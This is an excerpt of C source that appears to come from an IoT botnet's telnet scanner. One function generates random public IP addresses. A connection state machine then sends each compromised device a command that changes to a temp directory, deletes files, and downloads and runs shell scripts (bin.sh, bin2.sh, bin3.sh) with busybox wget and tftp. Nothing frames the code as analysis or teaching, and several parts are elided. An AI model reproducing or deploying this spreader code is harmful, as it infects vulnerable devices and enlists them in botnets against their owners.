...
in_addr_t getRandomPublicIP()
{
        ...
        szprintf(ip, "%d.%d.%d.%d", ip1, ip2, ip3, ip4);
        return inet_addr(ip);
}
        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt;rm *;busybox wget http:///bin.sh; sh bin.sh; busybox tftp -r bin2.sh -g ; sh bin2.sh; busybox tftp  -c get bin3.sh;sh bin3.sh\r\n", 197, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
